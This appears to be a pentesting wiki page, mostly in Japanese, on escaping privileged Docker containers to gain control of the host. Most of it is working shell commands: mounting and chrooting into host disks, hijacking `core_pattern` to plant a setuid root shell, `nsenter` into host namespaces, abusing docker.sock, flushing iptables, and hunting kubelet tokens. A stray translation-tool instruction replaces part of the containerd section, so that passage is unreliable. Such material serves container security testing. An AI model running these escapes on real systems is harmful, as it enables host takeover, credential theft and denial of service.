# `--privileged` コンテナからの脱出

{{#include ../../../banners/hacktricks-training.md}}

## 概要

`--privileged` で起動されたコンテナは、単に1つか2つの権限が追加された普通のコンテナとは異なります。実際には、`--privileged` は通常ワークロードを危険なホスト資源から遠ざけるデフォルトのランタイム保護のいくつかを削除または弱体化します。正確な影響はランタイムとホストに依存しますが、Docker では通常次のような結果になります:

- すべての capabilities が付与される
- device cgroup による制限が解除される
- 多くのカーネルファイルシステムが読み取り専用でマウントされなくなる
- デフォルトでマスクされた procfs パスが消える
- seccomp filtering が無効化される
- AppArmor の隔離が無効化される
- SELinux の隔離が無効化されるか、はるかに広いラベルに置き換えられる

重要な結果として、特権コンテナは通常、巧妙なカーネルエクスプロイトを必要としません。多くの場合、ホストデバイス、ホストに露出したカーネルファイルシステム、またはランタイムインタフェースと直接やり取りして、そのままホストのシェルにピボットできます。

## `--privileged` が自動的に変更しないもの

`--privileged` はホストの PID、ネットワーク、IPC、または UTS 名前空間に自動的に参加しません。特権コンテナは依然としてプライベートな名前空間を持ち得ます。つまり、いくつかの脱出チェーンは次のような追加条件を必要とします:

- ホストのバインドマウント
- ホスト PID の共有
- ホストネットワーキング
- ホストデバイスが見えていること
- 書き込み可能な proc/sys インターフェース

これらの条件は実際のミスコンフィギュレーションでは満たしやすいことが多いですが、概念的には `--privileged` 自体とは別の問題です。

## 脱出経路

### 1. 公開されたデバイス経由でホストディスクをマウントする

特権コンテナは通常、`/dev` 以下ではるかに多くのデバイスノードを見ます。ホストのブロックデバイスが見えている場合、最も単純な脱出はそれをマウントして `chroot` でホストのファイルシステムに入ることです:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
root partition が明確でない場合は、まず block layout を列挙してください:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
実際に `chroot` する代わりに書き込み可能なホストのマウントに setuid helper を配置するのが現実的な手段である場合、すべてのファイルシステムが setuid bit を尊重するわけではないことを覚えておいてください。ホスト側での簡単な確認は次のとおりです：
```bash
mount | grep -v "nosuid"
```
これは有用です。なぜなら `nosuid` ファイルシステム下の書き込み可能なパスは、古典的な "drop a setuid shell and execute it later" ワークフローにおいてはるかに魅力が低いからです。

ここで悪用されている弱体化された保護は次のとおりです:

- full device exposure
- broad capabilities, especially `CAP_SYS_ADMIN`

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Or Reuse A Host Bind Mount And `chroot`

If the host root filesystem is already mounted inside the container, or if the container can create the necessary mounts because it is privileged, a host shell is often only one `chroot` away:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
host root bind mount が存在しないが host storage にアクセス可能な場合は、1つ作成する:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
このパスは以下を悪用します:

- weakened mount restrictions
- full capabilities
- lack of MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Writable `/proc/sys` または `/sys` の悪用

`--privileged` の大きな結果の一つは、procfs と sysfs の保護が著しく弱くなることです。これにより、通常はマスクされているか読み取り専用でマウントされているホスト向けのカーネルインターフェースが露出する可能性があります。

古典的な例としては `core_pattern` があります:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
その他の高価値パスには次のものが含まれます:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
この経路は次の点を悪用します:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount または Namespace ベースのエスケープでフル capabilities を使用する

privileged container は、通常のコンテナから除去される `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` など多数の capabilities を取得します。別の公開された攻撃面が存在すると、これだけでローカルの足がかりをホストへのエスケープに変えるのに十分な場合が多いです。

簡単な例としては、追加のファイルシステムをマウントし、namespace entry を使用することが挙げられます:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
ホスト PID も共有されている場合、手順はさらに短くなります:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
この経路は以下を悪用します：

- デフォルトの特権 capability セット
- オプションのホスト PID 共有

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

特権コンテナでは、ホストのランタイム状態やソケットが見えることがよくあります。Docker、containerd、または CRI-O のソケットにアクセスできる場合、最も単純なアプローチはランタイム API を使ってホストアクセスを持つ二つ目のコンテナを起動することです：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
該当セクションの英語テキスト（"For containerd:" の直後から）を貼ってください。containerd は翻訳しません。
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
この経路は以下を悪用します:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. ネットワーク分離の副作用を除去する

`--privileged` 自体はホストの network namespace に参加するわけではありませんが、コンテナが `--network=host` を持つ、またはその他のホストネットワークアクセスがある場合、ネットワークスタック全体が変更可能になります:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
これは必ずしも直接的なホストシェルを意味するわけではありませんが、denial of service、トラフィックの傍受、またはループバックのみの管理サービスへのアクセスを引き起こす可能性があります。

関連ページ：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. ホストのシークレットとランタイム状態の読み取り

端末のクリーンなシェル脱出が即座に得られない場合でも、特権コンテナはしばしばホストのシークレット、kubelet state、ランタイムメタデータ、隣接するコンテナのファイルシステムを読み取るのに十分なアクセス権を持っています：
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var` がホストにマウントされている、またはランタイムディレクトリが見えている場合、ホストシェルを取得する前でも、lateral movement や cloud/Kubernetes credential theft のために十分な場合があります。

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## チェック

以下のコマンドの目的は、どの privileged-container escape families がすぐに実行可能かを確認することです。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
ここで興味深い点:

- 完全な capability セット、特に `CAP_SYS_ADMIN`
- 書き込み可能な proc/sys の露出
- 見えるホストデバイス
- seccomp と MAC confinement の欠如
- runtime sockets またはホストルートの bind mounts

これらのいずれか1つだけでも post-exploitation に十分な場合があります。複数が揃っていると、コンテナは実質的に1〜2コマンドで host compromise に至ることが多いです。

## 関連ページ

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
